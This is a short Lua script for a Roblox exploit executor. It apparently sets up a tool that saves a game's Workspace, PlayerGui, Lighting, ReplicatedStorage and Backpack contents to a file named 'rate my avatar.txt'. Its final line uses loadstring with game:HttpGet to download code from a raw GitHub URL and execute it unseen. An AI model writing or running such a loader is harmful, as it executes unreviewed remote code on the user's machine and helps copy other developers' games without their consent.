local Nam = "rate my avatar.txt"
local ItemsCap = 50000
local plr = game:GetService("Players").LocalPlayer
local target = {game:GetService("Workspace"),plr.PlayerGui,game:GetService("Lighting"),game:GetService("ReplicatedStorage"),plr.Backpack}

local ReplicatedStorage = game:GetService("ReplicatedStorage")
if Nam == "" then
    error("you forgor to enter filename ðŸ’€")
else
    local new
    if not ReplicatedStorage:FindFirstChild("OhioFileName") then
        new = Instance.new("StringValue")
        new.Name = "OhioFileName"
        new.Parent = ReplicatedStorage
    else
        new = ReplicatedStorage:FindFirstChild("OhioFileName")
    end
    new.Value = Nam
    local newCap
    if not ReplicatedStorage:FindFirstChild("OhioItemsCap") then
        newCap = Instance.new("IntValue")
        newCap.Name = "OhioItemsCap"
        newCap.Parent = ReplicatedStorage
    else
        newCap = ReplicatedStorage:FindFirstChild("OhioItemsCap")
    end
    newCap.Value = ItemsCap
    local newFol
    if not ReplicatedStorage:FindFirstChild("OhioTargetFolder") then
        newFol = Instance.new("Folder")
        newFol.Name = "OhioTargetFolder"
        newFol.Parent = ReplicatedStorage
    else
        newFol = ReplicatedStorage:FindFirstChild("OhioTargetFolder")
        newFol:ClearAllChildren()
    end
    for _,v in pairs(target) do
        local new2 = Instance.new("ObjectValue")
        new2.Value = v
        new2.Parent = newFol
    end


    loadstring(game:HttpGet('https://raw.githubusercontent.com/Level5Gyatt/broobruh/main/v49.txt',true))()
end
